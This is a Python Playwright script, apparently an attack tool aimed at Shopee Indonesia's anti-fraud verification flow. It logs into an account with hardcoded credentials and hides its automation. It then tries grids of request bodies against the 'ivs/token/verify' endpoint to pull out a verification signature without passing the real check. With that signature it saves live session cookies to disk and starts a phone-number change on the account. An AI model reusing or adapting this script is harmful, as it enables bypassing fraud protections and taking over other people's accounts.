# -*- coding: utf-8 -*-
"""verify_confirm.py — konfirmasi schema: field 'method' untuk token/verify.

Temuan schema_v2:
  method_name (int/str)  -> 49900000 / 211
  field 'method' int     -> 90309999  <-- VALID!
  event string "1"       -> 90309999  <-- juga valid (atau kebetulan)

Artinya body token/verify = {method, event, u_token, r_token, v_token, ...}
Hipotesis: SDK kirim 'method_name' tapi server baca 'method', ATAU di
bundle jumlah param berbeda. Sekarang uji grid lengkap dengan field 'method'.
"""
import sys, json

USER = sys.argv[1] if len(sys.argv) > 1 else "yq7uwh456q"
PASSW = sys.argv[2] if len(sys.argv) > 2 else "qwertyui123"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
PROXY = "http://127.0.0.1:18080"
OUT = "/root/shopee-verify/verify_confirm.json"


def log(*a):
    print(*a, flush=True)


from playwright.sync_api import sync_playwright

res = {"grid": []}
TARGETS = [
    "/api/v4/anti_fraud/change_phone_init_v2",
    "/api/v4/account/change_phone_init_v2",
    "/api/v4/anti_fraud/ivs/token/verify",
]

with sync_playwright() as pw:
    br = pw.chromium.launch(headless=True, args=[
        "--no-sandbox", "--disable-dev-shm-usage", "--window-size=1366,1000",
        "--disable-blink-features=AutomationControlled"])
    ctx = br.new_context(user_agent=UA, locale="id-ID",
                         viewport={"width": 1366, "height": 1000},
                         timezone_id="Asia/Jakarta", proxy={"server": PROXY})
    pg = ctx.new_page()
    seen = []

    def onresp(r):
        if "/api/v4/" in r.url and any(k in r.url for k in ("ivs", "login", "change_phone")):
            try:
                seen.append({"url": r.url.split("shopee.co.id")[-1][:80],
                             "body": r.text()[:2500]})
            except Exception:
                pass

    pg.on("response", onresp)

    log("=== login ===")
    pg.goto("https://shopee.co.id/buyer/login", wait_until="domcontentloaded", timeout=90000)
    for _ in range(15):
        if pg.locator('input[name="loginKey"]').count() > 0:
            break
        pg.wait_for_timeout(2000)
    pg.wait_for_timeout(3000)
    el = pg.locator('input[name="loginKey"]').first
    el.click(force=True)
    el.type(USER, delay=40)
    pg.wait_for_timeout(600)
    el.press("Enter")
    pg.wait_for_timeout(3500)
    pwi = pg.locator('input[type="password"]').first
    pwi.wait_for(state="visible", timeout=25000)
    pwi.click(force=True)
    pwi.type(PASSW, delay=45)
    pg.wait_for_timeout(600)
    pwi.press("Enter")
    pg.wait_for_timeout(11000)

    u_token = methods = None
    flow_no = None
    for it in seen:
        try:
            j = json.loads(it["body"])
        except Exception:
            continue
        d = j.get("data")
        if "login_by_password" in it["url"] and isinstance(d, dict):
            u_token = d.get("ivs_token") or u_token
            flow_no = d.get("ivs_flow_no") or flow_no
        if "ivs/methods" in it["url"] and isinstance(d, list):
            methods = d

    if not u_token or not methods:
        log("❌ no token")
        br.close()
        sys.exit(1)
    mtype = methods[0]["type"]
    vtok = methods[0]["v_token"]
    log(f"  u_token={len(u_token)}B type={mtype}")

    pg.evaluate("""async (b)=>{
      await fetch('/api/v4/anti_fraud/ivs/method/select',{method:'POST',
        credentials:'include',headers:{'Accept':'application/json',
        'Content-Type':'application/json','X-API-SOURCE':'pc',
        'X-Requested-With':'XMLHttpRequest','X-Shopee-Language':'id'},
        body:JSON.stringify(b)});
    }""", {"v_token": vtok, "method": mtype, "event": 1, "u_token": u_token})
    pg.wait_for_timeout(2000)

    # GRID field 'method'
    grid = [
        ("m_only", {"method": mtype, "event": 1, "u_token": u_token,
                    "v_token": vtok}),
        ("m_r", {"method": mtype, "event": 1, "u_token": u_token,
                 "v_token": vtok, "r_token": None}),
        ("m_df", {"method": mtype, "event": 1, "u_token": u_token,
                  "v_token": vtok, "shopee_df": None}),
        ("m_misc", {"method": mtype, "event": 1, "u_token": u_token,
                    "v_token": vtok, "misc": {"seed": None, "operation": 0}}),
        ("m_full", {"method": mtype, "event": 1, "u_token": u_token,
                    "v_token": vtok, "r_token": None, "shopee_df": None,
                    "misc": {"seed": None, "operation": 0}}),
        ("m_flow", {"method": mtype, "event": 1, "u_token": u_token,
                    "v_token": vtok, "flow_no": flow_no,
                    "misc": {"seed": None, "operation": 0}}),
    ]
    for name, b in grid:
        r = pg.evaluate("""async (body)=>{
          const r=await fetch('/api/v4/anti_fraud/ivs/token/verify',{
            method:'POST',credentials:'include',
            headers:{'Accept':'application/json','Content-Type':'application/json',
                     'X-API-SOURCE':'pc','X-Requested-With':'XMLHttpRequest',
                     'X-Shopee-Language':'id'},
            body:JSON.stringify(body)});
          let j=null;try{j=await r.json();}catch(e){}
          return {s:r.status,j};
        }""", b)
        e = (r.get("j") or {}).get("error")
        dd = (r.get("j") or {}).get("data")
        sig = dd.get("signature") if isinstance(dd, dict) else None
        log(f"  [{name:8s}] err={e} sig={'Y' if sig else 'N'} data={str(dd)[:60]}")
        res["grid"].append({"name": name, "err": e, "sig": bool(sig),
                            "data": str(dd)[:120]})
        if sig:
            res["signature"] = sig
        pg.wait_for_timeout(1100)

    # kalau dapat signature, coba change_phone_precheck
    if res.get("signature"):
        log("\n=== 🟢 SIGNATURE — coba change_phone_precheck_v2 ===")
        ck = "; ".join(f"{c['name']}={c['value']}" for c in ctx.cookies())
        open("/root/shopee-verify/ck_live.txt", "w").write(ck)
        pre = pg.evaluate("""async (body)=>{
          const r=await fetch('/api/v4/anti_fraud/change_phone_precheck_v2',{
            method:'POST',credentials:'include',
            headers:{'Accept':'application/json','Content-Type':'application/json',
                     'X-API-SOURCE':'pc','X-Requested-With':'XMLHttpRequest'},
            body:JSON.stringify(body)});
          let j=null;try{j=await r.json();}catch(e){}
          return {s:r.status,j};
        }""", {"new_phone": "6283191104601", "signature": res["signature"],
                "change_phone_token": None})
        log(f"  precheck: {(pre.get('j') or {}).get('error')} {str((pre.get('j') or {}).get('data'))[:120]}")
        res["precheck"] = pre

    json.dump(res, open(OUT, "w"), indent=1)
    br.close()

log("\n=== SELESAI ===")
